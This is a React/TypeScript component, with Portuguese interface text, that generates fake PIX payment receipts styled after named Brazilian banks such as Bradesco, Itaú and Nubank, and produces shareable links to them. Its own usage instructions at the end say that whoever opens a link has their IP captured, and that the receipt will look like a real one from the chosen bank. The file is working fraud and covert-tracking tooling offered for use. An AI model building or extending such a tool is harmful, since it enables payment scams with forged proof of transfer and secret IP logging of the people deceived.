
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { ArrowLeft, Copy, Receipt, RefreshCw, ExternalLink } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface ReceiptGeneratorProps {
  onBack: () => void;
}

const ReceiptGenerator: React.FC<ReceiptGeneratorProps> = ({ onBack }) => {
  const [receiptId, setReceiptId] = useState('');
  const [recipientName, setRecipientName] = useState('');
  const [pixKey, setPixKey] = useState('');
  const [senderName, setSenderName] = useState('');
  const [amount, setAmount] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const { toast } = useToast();

  const banks = [
    { id: 'bradesco', name: 'Bradesco', color: 'bg-red-600', urlName: 'bradesco' },
    { id: 'bb', name: 'Banco do Brasil', color: 'bg-yellow-500', urlName: 'bancodobrasil' },
    { id: 'sicredi', name: 'Sicredi', color: 'bg-green-600', urlName: 'sicredi' },
    { id: 'itau', name: 'Itaú', color: 'bg-orange-500', urlName: 'itau' },
    { id: 'santander', name: 'Santander', color: 'bg-red-500', urlName: 'santander' },
    { id: 'caixa', name: 'Caixa Econômica', color: 'bg-blue-600', urlName: 'caixa' },
    { id: 'nubank', name: 'Nubank', color: 'bg-purple-600', urlName: 'nubank' },
    { id: 'inter', name: 'Banco Inter', color: 'bg-orange-600', urlName: 'bancointer' }
  ];

  const generateRandomId = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 12; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateReceipt = () => {
    if (!recipientName || !pixKey || !senderName || !amount || !selectedBank) {
      toast({
        title: "Erro",
        description: "Por favor, preencha todos os campos incluindo o banco.",
        variant: "destructive"
      });
      return;
    }

    const newId = generateRandomId();
    setReceiptId(newId);
    
    // Salvar dados do comprovante
    const savedReceipts = localStorage.getItem('iplogger-receipts');
    const receipts = savedReceipts ? JSON.parse(savedReceipts) : {};
    receipts[newId] = {
      recipientName,
      pixKey,
      senderName,
      amount: parseFloat(amount),
      bank: selectedBank,
      createdAt: new Date().toISOString()
    };
    localStorage.setItem('iplogger-receipts', JSON.stringify(receipts));
    
    toast({
      title: "Comprovante Gerado!",
      description: "Seu comprovante de PIX foi criado com sucesso.",
    });
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copiado!",
        description: "Link copiado para a área de transferência.",
      });
    });
  };

  const testReceipt = () => {
    if (receiptId && selectedBank) {
      const bank = banks.find(b => b.id === selectedBank);
      const bankName = bank?.urlName || 'banco';
      window.open(`${window.location.origin}/${bankName}/receipt/${receiptId}`, '_blank');
    }
  };

  const getReceiptUrl = () => {
    if (!receiptId || !selectedBank) return '';
    const bank = banks.find(b => b.id === selectedBank);
    const bankName = bank?.urlName || 'banco';
    return `${window.location.origin}/${bankName}/receipt/${receiptId}`;
  };

  const receiptUrl = getReceiptUrl();

  return (
    <div className="min-h-screen p-4">
      <div className="max-w-md mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center space-x-4">
          <Button
            onClick={onBack}
            variant="ghost"
            size="sm"
            className="text-white hover:bg-gray-800"
          >
            <ArrowLeft className="h-4 w-4" />
          </Button>
          <h1 className="text-xl font-bold text-white">Gerar Comprovante PIX</h1>
        </div>

        {/* Form */}
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white flex items-center space-x-2">
              <Receipt className="h-5 w-5 text-green-400" />
              <span>Dados do Comprovante</span>
            </CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <div>
              <Label htmlFor="bank" className="text-gray-300">
                Banco
              </Label>
              <Select value={selectedBank} onValueChange={setSelectedBank}>
                <SelectTrigger className="bg-gray-700 border-gray-600 text-white mt-1">
                  <SelectValue placeholder="Selecione o banco" />
                </SelectTrigger>
                <SelectContent className="bg-gray-700 border-gray-600">
                  {banks.map((bank) => (
                    <SelectItem key={bank.id} value={bank.id} className="text-white hover:bg-gray-600">
                      {bank.name}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div>
              <Label htmlFor="recipient" className="text-gray-300">
                Nome do Destinatário
              </Label>
              <Input
                id="recipient"
                value={recipientName}
                onChange={(e) => setRecipientName(e.target.value)}
                placeholder="João Silva"
                className="bg-gray-700 border-gray-600 text-white mt-1"
              />
            </div>

            <div>
              <Label htmlFor="pixkey" className="text-gray-300">
                Chave PIX
              </Label>
              <Input
                id="pixkey"
                value={pixKey}
                onChange={(e) => setPixKey(e.target.value)}
                placeholder="joao@email.com ou CPF/telefone"
                className="bg-gray-700 border-gray-600 text-white mt-1"
              />
            </div>

            <div>
              <Label htmlFor="sender" className="text-gray-300">
                Seu Nome
              </Label>
              <Input
                id="sender"
                value={senderName}
                onChange={(e) => setSenderName(e.target.value)}
                placeholder="Maria Santos"
                className="bg-gray-700 border-gray-600 text-white mt-1"
              />
            </div>

            <div>
              <Label htmlFor="amount" className="text-gray-300">
                Valor (R$)
              </Label>
              <Input
                id="amount"
                type="number"
                step="0.01"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
                placeholder="100.00"
                className="bg-gray-700 border-gray-600 text-white mt-1"
              />
            </div>

            <Button
              onClick={generateReceipt}
              className="w-full bg-green-600 hover:bg-green-700"
            >
              <RefreshCw className="mr-2 h-4 w-4" />
              Gerar Comprovante
            </Button>
          </CardContent>
        </Card>

        {/* Generated Receipt */}
        {receiptId && (
          <Card className="bg-gray-800 border-gray-700">
            <CardHeader>
              <CardTitle className="text-white flex items-center space-x-2">
                <Receipt className="h-5 w-5 text-green-400" />
                <span>Comprovante Gerado</span>
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="bg-gray-900 p-3 rounded border border-gray-600">
                <code className="text-green-400 text-sm break-all">
                  {receiptUrl}
                </code>
              </div>

              <div className="flex space-x-2">
                <Button
                  onClick={() => copyToClipboard(receiptUrl)}
                  className="flex-1 bg-gray-700 hover:bg-gray-600"
                >
                  <Copy className="mr-2 h-4 w-4" />
                  Copiar
                </Button>
                <Button
                  onClick={testReceipt}
                  className="flex-1 bg-green-600 hover:bg-green-700"
                >
                  <ExternalLink className="mr-2 h-4 w-4" />
                  Ver
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {/* Instructions */}
        <Card className="bg-gray-800 border-gray-700">
          <CardHeader>
            <CardTitle className="text-white">Como Usar</CardTitle>
          </CardHeader>
          <CardContent className="text-gray-300 text-sm space-y-2">
            <p>1. Selecione o banco desejado</p>
            <p>2. Preencha os dados do comprovante</p>
            <p>3. Clique em "Gerar Comprovante"</p>
            <p>4. Compartilhe o link gerado</p>
            <p>5. Quando alguém visualizar, o IP será capturado</p>
            <p>6. O comprovante parecerá real do banco escolhido</p>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default ReceiptGenerator;
